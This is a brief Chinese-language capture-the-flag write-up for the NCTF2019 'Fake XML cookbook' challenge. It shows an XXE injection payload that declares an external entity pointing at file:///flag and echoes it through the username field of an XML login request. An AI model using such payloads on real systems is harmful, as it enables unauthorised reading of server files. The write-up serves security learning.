# \[NCTF2019]Fake XML cookbook

## \[NCTF2019]Fake XML cookbook

## 考点

* XXE

## wp

打开就是登录界面，抓包，是XML

![](<../.gitbook/assets/image (34).png>)

会回显username，直接进行XXE注入

```xml
<!DOCTYPE ANY [
    <!ENTITY test SYSTEM "file:///flag">
]>
<user><username>&test;</username><password>123</password></user>
```

![](<../.gitbook/assets/image (27) (1).png>)
